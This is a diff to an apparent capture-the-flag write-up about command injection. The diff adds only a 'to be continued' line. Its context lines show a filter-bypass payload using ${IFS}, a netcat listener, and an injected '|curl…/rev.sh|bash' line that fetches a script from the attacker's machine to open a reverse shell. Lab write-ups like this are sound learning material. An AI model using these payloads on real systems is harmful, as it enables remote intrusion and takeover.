@@ -36,7 +36,8 @@ After hours of trying payloads, I found that this `|nc${IFS}10.11.85.53${IFS}555
 ![image](https://github.com/user-attachments/assets/ef3b720f-e148-4c22-aa4d-23731faf2308)<br />
 Now, to get a reverse shell, since we can't use `-`, what we can do is create a `rev.sh` file in our attacker's machine(can be found inside this folder). Next open a netcat listener on the attacker's machine, `nc -lnvp 6666`, and inject the curl command to get the rev.sh file and pipe it into bash. The final payload is this: `|curl${IFS}10.11.85.53/rev.sh|bash` :<br />
 ![image](https://github.com/user-attachments/assets/5efb5384-f0ed-4d03-ad29-ed0535c63592)<br />
-Again, [stabilize the shell](https://maxat-akbanov.com/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal). 
+Again, [stabilize the shell](https://maxat-akbanov.com/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal). <br />
+TO BE CONTINUED...
 
 
 - What is the first flag?
